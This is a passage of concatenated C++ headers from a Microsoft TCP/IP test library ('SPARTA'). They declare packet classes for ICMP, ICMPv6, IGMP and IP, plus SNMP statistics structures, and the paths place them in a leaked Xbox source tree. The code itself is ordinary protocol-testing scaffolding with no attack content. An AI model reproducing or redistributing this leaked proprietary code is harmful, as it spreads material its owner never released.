   CICMPv6Header(PVOID pvRawData, DWORD dwBytesRemaining, OUT PDWORD pdwBytesRead);
    
   ~CICMPv6Header();

   SPARTA_STATUS ChainICMPPacketLinks();


   // ICMP Set Functions - Common functions

   SPARTA_STATUS SetCode(UCHAR code);
   SPARTA_STATUS SetType(UCHAR type);
   SPARTA_STATUS SetChksum(USHORT chksum);

   UCHAR GetCode();
   UCHAR GetType();
   USHORT GetChksum();

   //////////////////////////////////
   // Echo Request Reply functions
   //////////////////////////////////

   // ICMP Set Functions

   SPARTA_STATUS SetIcmpID(WORD id);
   SPARTA_STATUS SetIcmpSeq(WORD seq);
        
   // ICMP Get Functions

   WORD GetIcmpID();
   WORD GetIcmpSeq();

   //////////////////////////////////
   // functions dealing with reserved bytes
   //////////////////////////////////


   SPARTA_STATUS  SetReserved(ULONG Reserved);
   ULONG          GetReserved();

   //////////////////////////////////
   // other functions for error reports
   //////////////////////////////////

   SPARTA_STATUS  SetMTU(ULONG mtu);
   ULONG          GetMTU();

   SPARTA_STATUS  SetPointer(ULONG ptr);
   ULONG          GetPointer();

   //
   // Functions for handling the ICMP Error Messages
   //
   SPARTA_STATUS AttachIPErrPacket(CIPPacket *IPPacket);

   // The following functions return NULL if the corresponding err header is
   // not attached. Otherwise they return pointer to the corresponding header.
   CIPHeader   *GetIPErrHeader();
   CICMPv6Header *GetICMPErrHeader();
   CTCPHeader  *GetTCPErrHeader();
   CUDPHeader  *GetUDPErrHeader();

   ///////////////////////////////////////
   // neighbor discovery and family support
   ///////////////////////////////////////
   SPARTA_STATUS  SetCurrentHopLimit(UCHAR Limit);
   UCHAR          GetCurrentHopLimit();
   SPARTA_STATUS  SetManagedAddrFlag(BOOL Flag);
   BOOL           GetManagedAddrFlag();
   SPARTA_STATUS  SetStatefulConfigFlag(BOOL Flag);
   BOOL           GetStatefulConfigFlag();
   SPARTA_STATUS  SetRouterLifetime(USHORT Lifetime);
   USHORT         GetRouterLifetime();
   SPARTA_STATUS  SetReachableTimer(ULONG ReachTime);
   ULONG          GetReachableTimer();
   SPARTA_STATUS  SetRetransmitTimer(ULONG ReTime);
   ULONG          GetRetransmitTimer();

   SPARTA_STATUS  SetMaxDelay(USHORT Delay);
   USHORT         GetMaxDelay();

   SPARTA_STATUS  SetTargetAddress(IPv6Addr *pAddr);
   SPARTA_STATUS  GetTargetAddress(IPv6Addr *pAddr);

   SPARTA_STATUS  SetRouterFlag(BOOL Flag);
   BOOL           GetRouterFlag();
   SPARTA_STATUS  SetSolicitedFlag(BOOL Flag);
   BOOL           GetSolicitedFlag();
   SPARTA_STATUS  SetOverrideFlag(BOOL Flag);
   BOOL           GetOverrideFlag();
   SPARTA_STATUS  SetDestinationAddress(IPv6Addr *pAddr);
   SPARTA_STATUS  GetDestinationAddress(IPv6Addr *pAddr);

   ////////////////////////////////////////
   // options support
   ////////////////////////////////////////

   SPARTA_STATUS  AddSourceAddressOption(UCHAR Length, PCHAR Addr);
   SPARTA_STATUS  AddSourceAddressOption(MAC_MEDIA_TYPE Type, TCHAR *strAddr);
   SPARTA_STATUS  AddTargetAddressOption(UCHAR Length, PCHAR Addr);
   SPARTA_STATUS  AddTargetAddressOption(MAC_MEDIA_TYPE Type, TCHAR *strAddr);
   SPARTA_STATUS  AddPrefixOption(UCHAR Length, UCHAR Flags, 
                                  ULONG Valid, ULONG Preferred, 
                                  ULONG Reserved, IPv6Addr *pAddr);
  
   SPARTA_STATUS  AddHeaderOption(USHORT MaxLength, USHORT Reserved1, ULONG Reserved2, CIPPacket *IPPacket);
   SPARTA_STATUS  AddMTUOption(USHORT Reserved, ULONG MTU);
   SPARTA_STATUS  AddOption(UCHAR Type, USHORT Length, PCHAR Data);

   ULONG          GetNumOptions()
   {
      return m_NumOptions;
   }

   SPARTA_STATUS  GetOption(USHORT Slot, PUCHAR Type, PUSHORT Length, PCHAR Data);
   UCHAR          GetOptionType(USHORT Slot);
   SPARTA_STATUS  GetSourceAddressOption(USHORT Slot, PCHAR Addr, PUCHAR Length);
   SPARTA_STATUS  GetTargetAddressOption(USHORT Slot, PCHAR Addr, PUCHAR Length);
   SPARTA_STATUS  GetPrefixOption(USHORT Slot, PUCHAR Length, PUCHAR Flags, PULONG Valid,
                                  PULONG Preferred, PULONG Reserved, IPv6Addr *pAddr);
   SPARTA_STATUS  GetHeaderOption(USHORT Slot, PUSHORT MaxLength, PUSHORT Reserved1, PULONG Reserved2,
                                  PVOID pvBuffer, DWORD *dwLen);
   SPARTA_STATUS  GetMTUOption(USHORT Slot, PUSHORT Reserved, PULONG MTU);


   ////////////////////////////////////////
   // misc
   ////////////////////////////////////////

   void           Print();


};

#endif // __SPARTA_ICMPv6HEADER_H__
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\network\tcpip\sparta\inc\igmpheaderv1.hpp ===
/****************************************************************************************
*                                    SPARTA project                                     *
*                                                                                       *
* (TCP/IP test team)                                                                    *
*                                                                                       *
* Filename: IGMPHeaderV1.hpp                                                               *
* Description: This is the implementation of the MediaHeader functions                  *
*                                                                                       *
*                                                                                       *
* Revision history:     name          date         modifications                        *
*                                                                                       *
*                       deepakp      5/22/2000    created                              *
*                                                                                       *
*                                                                                       *
*                (C) Copyright Microsoft Corporation 1999-2000                          *
*****************************************************************************************/

#ifndef __SPARTA_IGMPHeaderV1_H__
#define __SPARTA_IGMPHeaderV1_H__

#include "sparta.h"
#include "packets.h"
#include "IPConstants.h"


typedef struct
{
   USHORT reserved;
   UCHAR  minorVer;
   UCHAR  majorVer;
}tDVMRP,*DVMRP;



typedef struct
{
   UCHAR igmp_ver_type;
   UCHAR igmp_code;
   USHORT igmp_chksum;

   union
   {
      ULONG igmp_group;
      tDVMRP dvmrp;
   }dvmrp_group_union;

#define igmp_group              dvmrp_group_union.igmp_group
#define igmp_reserved           dvmrp_group_union.dvmrp.reserved
#define igmp_minorVer           dvmrp_group_union.dvmrp.minorVer
#define igmp_majorVer           dvmrp_group_union.dvmrp.majorVer

} tIGMPHeaderV1, *IGMPHeaderV1;



class CIGMPHeaderV1
{
   friend class CIGMPPacketV1;

   AUTO_CAL_TYPES m_autoCalcIGMPChecksum;
   IGMPHeaderV1 m_pIGMPHeaderV1;

protected:

   PKT_BUFFER m_IGMPHeaderV1; // we want access to these members from the CIGMPPacketV1 class

public:

   PVOID GetRawBuffer();
   DWORD GetRawBufferLength();
    

   CIGMPHeaderV1(UCHAR type);

   CIGMPHeaderV1(PVOID pvRawData, DWORD dwBytesRemaining, OUT PDWORD pdwBytesRead);
    
   ~CIGMPHeaderV1();

   SPARTA_STATUS SetVersion(UCHAR ver);

   SPARTA_STATUS SetType(UCHAR type);

   SPARTA_STATUS SetCode(UCHAR code);

   SPARTA_STATUS SetChksum(USHORT chksum);

   SPARTA_STATUS SetGroupAddr(DWORD addr);      // NETWORK byte order

   SPARTA_STATUS SetGroupAddr(TCHAR * addr)
   {
      return SetGroupAddr(inet_addr(addr));
   }

   UCHAR GetVersion();

   UCHAR GetType();

   UCHAR GetCode();

   USHORT GetChksum();

   DWORD GetGroupAddr();      // NETWORK byte order

   SPARTA_STATUS SetAutoCalcChecksum(const AUTO_CAL_TYPES status);

   USHORT CalcChecksum();

   SPARTA_STATUS PreparePacketForSend();



// Methods for DVMRP, type 0x13



   SPARTA_STATUS SetDVMRPReserved(USHORT res);
   SPARTA_STATUS SetDVMRPMinorVer(UCHAR ver);
   SPARTA_STATUS SetDVMRPMajorVer(UCHAR ver);


   USHORT GetDVMRPReserved();
   UCHAR GetDVMRPMinorVer();
   UCHAR GetDVMRPMajorVer();

   void Print();
};

#endif // __SPARTA_IGMPHeaderV1_H__
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\network\tcpip\sparta\inc\igmpheaderv2.hpp ===
/****************************************************************************************
*                                    SPARTA project                                     *
*                                                                                       *
* (TCP/IP test team)                                                                    *
*                                                                                       *
* Filename: IGMPHeaderV2.hpp                                                               *
* Description: This is the implementation of the MediaHeader functions                  *
*                                                                                       *
*                                                                                       *
* Revision history:     name          date         modifications                        *
*                                                                                       *
*                       deepakp      5/22/2000    created                              *
*                                                                                       *
*                                                                                       *
*                (C) Copyright Microsoft Corporation 1999-2000                          *
*****************************************************************************************/

#ifndef __SPARTA_IGMPHeaderV2_H__
#define __SPARTA_IGMPHeaderV2_H__

#include "sparta.h"
#include "packets.h"
#include "IPConstants.h"


typedef struct
{
   UCHAR igmp_type;
   UCHAR igmp_code;
   USHORT igmp_chksum;
   ULONG igmp_group;
} tIGMPHeaderV2, *IGMPHeaderV2;



class CIGMPHeaderV2
{

   friend class CIGMPPacketV2;
        
   AUTO_CAL_TYPES m_autoCalcIGMPChecksum;
   IGMPHeaderV2 m_pIGMPHeaderV2;

protected:

   PKT_BUFFER m_IGMPHeaderV2; // we want access to these members from the CIGMPPacketV2 class

public:

   PVOID GetRawBuffer();
   DWORD GetRawBufferLength();
    

   CIGMPHeaderV2(UCHAR type);

   CIGMPHeaderV2(PVOID pvRawData, DWORD dwBytesRemaining, OUT PDWORD pdwBytesRead);
    
   ~CIGMPHeaderV2();

   SPARTA_STATUS SetType(UCHAR type);

   SPARTA_STATUS SetMaxResponseTime(UCHAR code);

   SPARTA_STATUS SetChksum(USHORT chksum);

   SPARTA_STATUS SetGroupAddr(DWORD addr);   //NETWORK byte order

   SPARTA_STATUS SetGroupAddr(TCHAR * addr)
   {
      return SetGroupAddr(inet_addr(addr));
   }

   UCHAR GetType();

   UCHAR GetMaxResponseTime();

   USHORT GetChksum();

   DWORD GetGroupAddr();      // NETWORK byte order

   SPARTA_STATUS SetAutoCalcChecksum(const AUTO_CAL_TYPES status);

   USHORT CalcChecksum();

   SPARTA_STATUS PreparePacketForSend();

   void Print();

};

#endif // __SPARTA_IGMPHeaderV2_H__
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\network\tcpip\sparta\inc\icmpheader.hpp ===
/****************************************************************************************
*                                    SPARTA project                                     *
*                                                                                       *
* (TCP/IP test team)                                                                    *
*                                                                                       *
* Filename: ICMPHeader.hpp                                                              *
* Description: This is the description of the ICMPHeader functions                      *
*                                                                                       *
*                                                                                       *
* Revision history:     name          date         modifications                        *
*                                                                                       *
*                       deepakp      5/2/2000    created                                *
*                                                                                       *
*                                                                                       *
*                (C) Copyright Microsoft Corporation 1999-2000                          *
*****************************************************************************************/

#ifndef __SPARTA_ICMPHEADER_H__
#define __SPARTA_ICMPHEADER_H__


#include "packets.h"
#include "IPPacket.hpp"
#include "UDPPacket.hpp"
#include "Parser.hpp"
#include "IPConstants.h"
#include "IPHeader.hpp"
#include "UDPHeader.hpp"
#include "TCPHeader.hpp"
#include "TCPPacket.hpp"
#include "IPConstants.h"

//
// structures for data portion of icmp header
//
struct   tReqReply
{
   WORD  ID;
   WORD  SeqNo;
};
typedef  tReqReply   *ReqReply;

struct   tParmProb         // _ParameterProblemFields 
{
   BYTE  Pointer;          // pointer to the original ip header with parameter problem
   BYTE  junk[3];
};
typedef  tParmProb   *ParmProb;

struct   tPMTUDiscovery    // _PathMTUDiscoveryFields
{
   WORD  MTUVoid;
   WORD  NextMTU;
};
typedef  tPMTUDiscovery *PMTUDiscovery;


struct   tRouterAH         // _RouterAnnounceHeaderFields
{
   BYTE  NumAddrs;
   BYTE  AddrEntrySize;
   WORD  Lifetime;
};
typedef  tRouterAH   *RouterAH;


struct   tTS               // _TimestampFields
{
   DWORD tsOrig;
   DWORD tsRecv;
   DWORD tsXmit;
};
typedef  tTS   *TS;


struct   tRouterAE         // _RouterAnnounceEntry
{
   DWORD Address;
   DWORD PreferenceLevel;
};
typedef  tRouterAE   *RouterAE;


//
// main icmp header structure
//
struct      tICMP_HEADER
{
   UCHAR    icmp_type;
   UCHAR    icmp_code;
   USHORT   icmp_chksum;

   union 
   {
      tParmProb      PP;         // parameter problem fields
      tReqReply      ReqRep;     // Request reply fields
      tRouterAH      RAH;        // Router Announce fields
      tPMTUDiscovery PMTUD;      // PMTU discovery fields
      ULONG          gwaddr;     // gateway address
      DWORD          unused;     // unused junk 
   }  icmp_header_union;

#define icmp_pptr             icmp_header_union.PP.Pointer
#define icmp_pjunk            icmp_header_union.PP.junk

#define icmp_id               icmp_header_union.ReqRep.ID
#define icmp_seq              icmp_header_union.ReqRep.SeqNo

#define icmp_numAddr          icmp_header_union.RAH.NumAddrs
#define icmp_addrEntrySize    icmp_header_union.RAH.AddrEntrySize
#define icmp_lifetime         icmp_header_union.RAH.Lifetime

#define icmp_mtuvoid          icmp_header_union.PMTUD.MTUVoid
#define icmp_nextmtu          icmp_header_union.PMTUD.NextMTU

#define icmp_gwaddr           icmp_header_union.gwaddr
#define icmp_unused           icmp_header_union.unused



   union 
   {
      tTS      TS;
      ULONG    mask;
      CHAR     data[1];
   }  icmp_data_union;
                
#define icmp_otime            icmp_data_union.TS.tsOrig
#define icmp_rtime            icmp_data_union.TS.tsRecv
#define icmp_ttime            icmp_data_union.TS.tsXmit

#define icmp_mask             icmp_data_union.mask
#define icmp_data             icmp_data_union.data


};
typedef  tICMP_HEADER   *ICMP_HEADER;



class CICMPHeader
{
   friend class CICMPPacket;

   // IP header including options that generated the ERROR for which this icmp packet
   // will be sent
   AUTO_CAL_TYPES m_autoCalcICMPChecksum;

   BOOL  ParseICMP(PVOID pvRawData, DWORD dwBytesRemaining, OUT PDWORD pdwBytesRead);

protected:

   // This buffer will have the pvData memeber field pointed to the ip structure
   PKT_BUFFER  m_ICMPHeader;     // we want access to these members from the IPPacket class
   ICMP_HEADER m_ICMPptr;        // we want access to these members from the IPPacket class

   PKT_BUFFER  m_ICMPRouterAE;   // we want access to these members from the IPPacket class

   UCHAR       m_icmpType;

   BOOL  m_IsIPHeaderChained;
   BOOL  m_IsIPHeaderDataChained;
   BOOL  m_IsIPOptionsChained;
   BOOL  m_IsICMPErrHeaderChained;
   BOOL  m_IsTCPErrHeaderChained;
   BOOL  m_IsUDPErrHeaderChained;
   BOOL  m_IsRouterAEChained;

   // This points to the IP Datagram (minus header) , the 8 bytes from the error datagram
   PKT_BUFFER  m_ICMPIPHeaderData;

   SPARTA_STATUS ProcessIPErrorDatagram(CIPPacket *packet,DWORD bytesToCopy);
   CICMPHeader(PVOID pvRawData, DWORD dwBytesRemaining);

public:
   CIPHeader   *pICMPIPHeader;
   CUDPHeader  *pICMPUDPHeader;
   CTCPHeader  *pICMPTCPHeader;
   CICMPHeader *pICMPICMPHeader;

   PKT_BUFFER  GetRawBuffer();
   DWORD       GetRawBufferLength();
    
   // Default Constructor
   CICMPHeader(UCHAR icmpType);


   // create a MEDIA header buffer from raw data, part of the parsing API
   // dwBytesRead will return the number of bytes used for the header
   // TO DO: Need to implement this function for parsing
   CICMPHeader(PVOID pvRawData, DWORD dwBytesRemaining, OUT PDWORD pdwBytesRead);
    
   ~CICMPHeader();


   SPARTA_STATUS ChainICMPPacketLinks();

   // ICMP Set Functions - Common functions

   SPARTA_STATUS SetCode(UCHAR code);
   SPARTA_STATUS SetType(UCHAR type);
   SPARTA_STATUS SetChksum(USHORT chksum);

   UCHAR GetCode();
   UCHAR GetType();
   USHORT GetChksum();

   //////////////////////////////////
   // Request Reply functions
   //////////////////////////////////

   // ICMP Set Functions

   SPARTA_STATUS SetIcmpID(WORD id);
   SPARTA_STATUS SetIcmpSeq(WORD seq);
        
   // ICMP Get Functions

   WORD GetIcmpID();
   WORD GetIcmpSeq();

   // ICMP Timestamp Options

   SPARTA_STATUS SetTSOrig(DWORD tsOrig);
   SPARTA_STATUS SetTSRecv(DWORD tsRecv);
   SPARTA_STATUS SetTSXmit(DWORD tsXmit);

   DWORD GetTSOrig();
   DWORD GetTSRecv();
   DWORD GetTSXmit();

   // ICMP Address mask Options

   // mask is in NETWORK byte order
   SPARTA_STATUS SetAddrMask(DWORD mask);
   SPARTA_STATUS SetAddrMask(TCHAR * mask)
   {
      return SetAddrMask(inet_addr(mask));
   }

   // NETWORK byte order
   DWORD GetAddrMask();

   ////////////////////////////////////
   // Functions for handling the ICMP Error Messages
   ////////////////////////////////////

   // Copies the IP header from the IP Datagram that genereted the error
   SPARTA_STATUS AttachIPErrPacket(CIPPacket *IPPacket);

   // The following functions return NULL if the corresponding err header is
   // not attached. Otherwise they return pointer to the corresponding header.
   CIPHeader   *GetIPErrHeader();
   CICMPHeader *GetICMPErrHeader();
   CTCPHeader  *GetTCPErrHeader();
   CUDPHeader  *GetUDPErrHeader();

   //////////////////////////////////
   // ICMP Redirect functions
   //////////////////////////////////

   SPARTA_STATUS  SetGatewayAddr(TCHAR * addr)
   {
      return SetGatewayAddr(inet_addr(addr));
   }
   //
   // NETWORK byte order
   //
   SPARTA_STATUS  SetGatewayAddr(DWORD  addr);
   DWORD          GetGatewayAddr();

   // ICMP Fragmentation Required Functions
   SPARTA_STATUS  SetMTU(USHORT mtu);
   USHORT         GetMTU();

   SPARTA_STATUS  SetParamPtr(UCHAR ptr);
   UCHAR          GetParamPtr();

   // Source Quench, UnReachable, Time Exceeded Packets, Parameter Problem, MTU ICMP packets
   //               The following is to set a particular value to the unused field
   //              The user should set it only when the user wants to set a non-zero value 
   //              This field stays zero by default(Required by RFC)
   //              NOTE: The functions are although common for all packets but the passed value
   //              will be truncated depending upon the number of unused bytes in each type of icmp packet
   //
   SPARTA_STATUS  SetUnused(ULONG unused);
   ULONG          GetUnused();

   // Router Advertisement
   // Not Yet implemented
   //
   SPARTA_STATUS SetNumberOfRouter(UCHAR nRouter);
   SPARTA_STATUS SetAddressEntrySize(UCHAR AddESize);
   SPARTA_STATUS SetRouterLifeTime(USHORT lifetime);

   UCHAR    GetNumberOfRouter();
   UCHAR    GetAddressEntrySize();
   USHORT   GetRouterLifeTime();

   SPARTA_STATUS  SetRouterAddrAt(DWORD index,TCHAR *addr)
   {
      return SetRouterAddrAt(index, inet_addr(addr));
   }
   //
   // address in NETWORK byte order
   //
   SPARTA_STATUS  SetRouterAddrAt(DWORD index,DWORD addr);
   SPARTA_STATUS  SetPreferenceLevelAt(DWORD index,ULONG level);

   //
   // address in NETWORK byte order
   //
   DWORD          GetRouterAddrAt(DWORD index);
   ULONG          GetPreferenceLevelAt(DWORD index);


   USHORT         CalcChecksum();
   SPARTA_STATUS  SetAutoCalcChecksum(const AUTO_CAL_TYPES status);
   SPARTA_STATUS  PreparePacketForSend();

   void           Print();


};

#endif // __SPARTA_ICMPHEADER_H__
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\network\tcpip\sparta\inc\igmppacketv1.hpp ===
/****************************************************************************************
*                                    SPARTA project                                     *
*                                                                                       *
* (TCP/IP test team)                                                                    *
*                                                                                       *
* Filename: IGMPPacket.hpp                                                               *
* Description: this defines the Packet class for IGMP Packets, extends the CIPPacket class*
*                                                                                       *
*                                                                                       *
* Revision history:     name          date         modifications                        *
*                                                                                       *
*                       deepakp      5/22/2000    created                               *
*                                                                                       *
*                                                                                       *
*                (C) Copyright Microsoft Corporation 1999-2000                          *
*****************************************************************************************/

#ifndef __SPARTA_IGMPV1_PACKET_H__
#define __SPARTA_IGMPV1_PACKET_H__

#include "sparta.h"
#include "IGMPHeaderV1.hpp"
#include "IPPacket.hpp"

class CIGMPPacketV1 : public CIPPacket
{
public:
    CIGMPHeaderV1 &IGMPHeaderV1;

    CIGMPPacketV1(MAC_MEDIA_TYPE MediaType,UCHAR igmpType);
    CIGMPPacketV1(PKT_PACKET Packet, CMacHeader &MacHeaderParam, CIPHeader &IPHeader,CIGMPHeaderV1 &IGMPHeaderV1);
    virtual ~CIGMPPacketV1();

    int GetPacketType();
	virtual SPARTA_STATUS PreparePacketForSend();

    virtual void PrintPacket();
};

#endif // __SPARTA_IGMPV1_PACKET_H__
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\network\tcpip\sparta\inc\ipinfo.h ===
/********************************************************************/
/**                     Microsoft LAN Manager                      **/
/**     Copyright (c) Microsoft Corporation. All rights reserved.  **/
/********************************************************************/
/* :ts=4 */

//** IPINFO.H - IP SNMP information definitions..
//
// This file contains all of the definitions for IP that are
// related to SNMP information gathering.

#ifndef IPINFO_INCLUDED
#define IPINFO_INCLUDED

#if _MSC_VER > 1000
#pragma once
#endif

#ifndef CTE_TYPEDEFS_DEFINED
#define CTE_TYPEDEFS_DEFINED

typedef unsigned long ulong;
typedef unsigned short ushort;
typedef unsigned char uchar;
typedef unsigned int uint;

#endif // CTE_TYPEDEFS_DEFINED


typedef struct IPSNMPInfo {
    ulong       ipsi_forwarding;
    ulong       ipsi_defaultttl;
    ulong       ipsi_inreceives;
    ulong       ipsi_inhdrerrors;
    ulong       ipsi_inaddrerrors;
    ulong       ipsi_forwdatagrams;
    ulong       ipsi_inunknownprotos;
    ulong       ipsi_indiscards;
    ulong       ipsi_indelivers;
    ulong       ipsi_outrequests;
    ulong       ipsi_routingdiscards;
    ulong       ipsi_outdiscards;
    ulong       ipsi_outnoroutes;
    ulong       ipsi_reasmtimeout;
    ulong       ipsi_reasmreqds;
    ulong       ipsi_reasmoks;
    ulong       ipsi_reasmfails;
    ulong       ipsi_fragoks;
    ulong       ipsi_fragfails;
    ulong       ipsi_fragcreates;
    ulong       ipsi_numif;
    ulong       ipsi_numaddr;
    ulong       ipsi_numroutes;
} IPSNMPInfo;

typedef struct ICMPStats {
    ulong       icmps_msgs;
    ulong       icmps_errors;
    ulong       icmps_destunreachs;
    ulong       icmps_timeexcds;
    ulong       icmps_parmprobs;
    ulong       icmps_srcquenchs;
    ulong       icmps_redirects;
    ulong       icmps_echos;
    ulong       icmps_echoreps;
    ulong       icmps_timestamps;
    ulong       icmps_timestampreps;
    ulong       icmps_addrmasks;
    ulong       icmps_addrmaskreps;
} ICMPStats;

typedef struct ICMPSNMPInfo {
    ICMPStats   icsi_instats;
    ICMPStats   icsi_outstats;
} ICMPSNMPInfo;

typedef struct ICMPv6Stats {
    ulong       icmps_msgs;
    ulong       icmps_errors;
    ulong       icmps_typecount[256];
} ICMPv6Stats;

typedef struct ICMPv6SNMPInfo {
    ICMPv6Stats   icsi_instats;
    ICMPv6Stats   icsi_outstats;
} ICMPv6SNMPInfo;

#define IP_FORWARDING       1
#define IP_NOT_FORWARDING   2

typedef struct IPAddrEntry {
    ulong       iae_addr;
    ulong       iae_index;
    ulong       iae_mask;
    ulong       iae_bcastaddr;
    ulong       iae_reasmsize;
    ushort      iae_context;
    ushort      iae_pad;
} IPAddrEntry;

typedef struct IPRouteEntry {
    ulong       ire_dest;
    ulong       ire_index;
    ulong       ire_metric1;
    ulong       ire_metric2;
    ulong       ire_metric3;
    ulong       ire_metric4;
    ulong       ire_nexthop;
    ulong       ire_type;
    ulong       ire_proto;
    ulong       ire_age;
    ulong       ire_mask;
    ulong       ire_metric5;
#ifdef NT
    ulong       ire_context;
#endif
} IPRouteEntry;

typedef struct IPRouteBlock {
    ulong       numofroutes;
    IPRouteEntry route[1];
} IPRouteBlock;

//
// Route with multiple nexthops and associated defns
//

typedef struct IPRouteNextHopEntry {
    ulong       ine_iretype;
    ulong       ine_nexthop;
    ulong       ine_ifindex;
#ifdef NT
    ulong       ine_context;
#endif
} IPRouteNextHopEntry;


typedef struct IPMultihopRouteEntry {
    ulong               imre_numnexthops;
    ulong               imre_flags;
    IPRouteEntry        imre_routeinfo;
    IPRouteNextHopEntry imre_morenexthops[1];
} IPMultihopRouteEntry;

#define IMRE_FLAG_DELETE_DEST   0x00000001

//
// Input context to pass when querying a route
//

typedef enum {
    IPNotifyNotification = 0,
    IPNotifySynchronization,
    IPNotifyMaximumVersion
} IPNotifyVersion;

typedef struct IPNotifyData {
    ulong       Version;   // See IPNotifyVersion above.
    ulong       Add;
    char        Info[1];
} IPNotifyData, *PIPNotifyData;

typedef struct IPNotifyOutput {
    ulong       ino_addr;
    ulong       ino_mask;
    ulong       ino_info[6];
} IPNotifyOutput, *PIPNotifyOutput;

typedef union IPRouteNotifyOutput {
    IPNotifyOutput irno_info;
    struct {
        ulong   irno_dest;
        ulong   irno_mask;
        ulong   irno_nexthop;
        ulong   irno_proto;
        ulong   irno_ifindex;
        ulong   irno_metric;
        ulong   irno_flags;
    };
} IPRouteNotifyOutput, *PIPRouteNotifyOutput;

#define IRNO_FLAG_ADD       0x00000001
#define IRNO_FLAG_DELETE    0x00000002

//
// Input context to pass when querying a route
//
typedef struct IPRouteLookupData {
    ulong       Version;   //version of this structure
    ulong       DestAdd;
    ulong       SrcAdd;
    char        Info[1];
} IPRouteLookupData, *PIPRouteLookupData;

typedef struct AddrXlatInfo {
    ulong       axi_count;
    ulong       axi_index;
} AddrXlatInfo;

#define IRE_TYPE_OTHER          1
#define IRE_TYPE_INVALID        2
#define IRE_TYPE_DIRECT         3
#define IRE_TYPE_INDIRECT       4

#define IRE_PROTO_OTHER         1
#define IRE_PROTO_LOCAL         2
#define IRE_PROTO_NETMGMT       3
#define IRE_PROTO_ICMP          4
#define IRE_PROTO_EGP           5
#define IRE_PROTO_GGP           6
#define IRE_PROTO_HELLO         7
#define IRE_PROTO_RIP           8
#define IRE_PROTO_IS_IS         9
#define IRE_PROTO_ES_IS         10
#define IRE_PROTO_CISCO         11
#define IRE_PROTO_BBN           12
#define IRE_PROTO_OSPF          13
#define IRE_PROTO_BGP           14
#define IRE_PROTO_PERSIST_LOCAL 10010

#define IRE_METRIC_UNUSED       0xffffffff

#define IP_MIB_STATS_ID                 1
#define IP_MIB_RTCHANGE_NOTIFY_ID       2
#define ICMP_MIB_STATS_ID               1

#define AT_MIB_ADDRXLAT_INFO_ID         1
#define AT_MIB_ADDRXLAT_ENTRY_ID        0x101

#define IP_MIB_RTTABLE_ENTRY_ID         0x101
#define IP_MIB_ADDRTABLE_ENTRY_ID       0x102
#define IP_MIB_RTTABLE_ENTRY_ID_EX      0x103

#define IP_INTFC_FLAG_P2P                 1
#define IP_INTFC_FLAG_P2MP                2
#define IP_INTFC_FLAG_UNIDIRECTIONAL      4


typedef struct IPInterfaceInfo {
    ulong       iii_flags;
    ulong       iii_mtu;
    ulong       iii_speed;
    ulong       iii_addrlength;
    uchar       iii_addr[1];
} IPInterfaceInfo;

#define IP_INTFC_INFO_ID                0x103
#define IP_MIB_SINGLE_RT_ENTRY_ID       0x104
#define IP_GET_BEST_SOURCE              0x105

#ifndef s6_addr

struct in6_addr {
    union {
        unsigned char Byte[16];
        unsigned short Word[8];
    } u;
};

#define in_addr6 in6_addr

/*
** Defines to match RFC 2553.
*/
#define _S6_un     u
#define _S6_u8     Byte
#define s6_addr    _S6_un._S6_u8

/*
** Defines for our implementation.
*/
#define s6_bytes   u.Byte
#define s6_words   u.Word

#endif

typedef struct IP6RouteEntry {
    ulong           ire_Length;
    struct in6_addr ire_Source;
    ulong           ire_ScopeId;
    ulong           ire_IfIndex;
} IP6RouteEntry;

#define IP6_MIB_STATS_ID       IP_MIB_STATS_ID
#define IP6_GET_BEST_ROUTE_ID  3
#define ICMP6_MIB_STATS_ID     4

#endif // IPINFO_INCLUDED
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\network\tcpip\sparta\inc\ipheader.hpp ===
/****************************************************************************************
*                                    SPARTA project                                     *
*                                                                                       *
* (TCP/IP test team)                                                                    *
*                                                                                       *
* Filename:    IPHeader.hpp                                                             *
* Description: This is the implementation of the IPHeader functions                     *
*              The IpHeader structure supports BOTH ipv4 and ipv6 headers               *
*                                                                                       *
*                                                                                       *
* Revision history:     name          date         modifications                        *
*                       deepakp      4/18/2000    created                               *
*                       balasha      5/02/2000    Added AutoChecksum Calculation        *
*                       timothyw     12/1/2000    added ipv6                            *
*                                                                                       *
*                (C) Copyright Microsoft Corporation 1999-2000                          *
*****************************************************************************************/

#ifndef __SPARTA_IPHEADER_H__
#define __SPARTA_IPHEADER_H__


#include "packets.h"
#include "media.h"
#include "Parser.hpp"
#include "IPOptions.hpp"         // ipv4 specific
#include "IPOptionsVector.hpp"   // ipv4 specific
#include "IPConstants.h"
#include "Media.h"
#include "Pattern.hpp"
#include "ipinfo.h"              // ipv6 specific


/////////////////////////////////////////////////
// defines, structures, etc for ipv4
/////////////////////////////////////////////////



//////////////////////////////////////////////////
// IPv4 Header format
//////////////////////////////////////////////////

#include <pshpack1.h>

struct IPv4Header 
{
   UCHAR           iph_verlen;                             // Version and length.
   UCHAR           iph_tos;                                // Type of service.
   USHORT          iph_length;                             // Total length of datagram.
   USHORT          iph_id;                                 // Identification.
   USHORT          iph_offset;                             // Flags and fragment offset.
   UCHAR           iph_ttl;                                // Time to live.
   UCHAR           iph_protocol;                           // Protocol.
   USHORT          iph_xsum;                               // Header Checksum.
   IPAddr          iph_src;                                // Source address.
   IPAddr          iph_dest;                               // Destination address.
};

#include <poppack.h>

/////////////////////////////////////////////////
// defines, structures, etc for ipv6
/////////////////////////////////////////////////

//////////////////////////////////////////////////
// IPv6 Header Format.
// See RFC 1883, page 5 (and subsequent draft updates to same).
// from net\tcpip\tpipv6\ip6.h
//
// #pragma pack(1)
//
// typedef struct IPv6Header {
//     u_long VersClassFlow;   // 4 bits Version, 8 Traffic Class, 20 Flow Label.
//     u_short PayloadLength;  // Zero indicates Jumbo Payload hop-by-hop option.
//     u_char NextHeader;      // Values are superset of IPv4's Protocol field.
//     u_char HopLimit;
//     struct IPv6Addr Source;
//     struct IPv6Addr Dest;
// } tIPv6Header;
// 
//////////////////////////////////////////////////


// for the benefit of users which won't include ip6.h

#define IP6_PROTOCOL_HOP_BY_HOP 0  // IPv6 Hop-by-Hop Options Header.
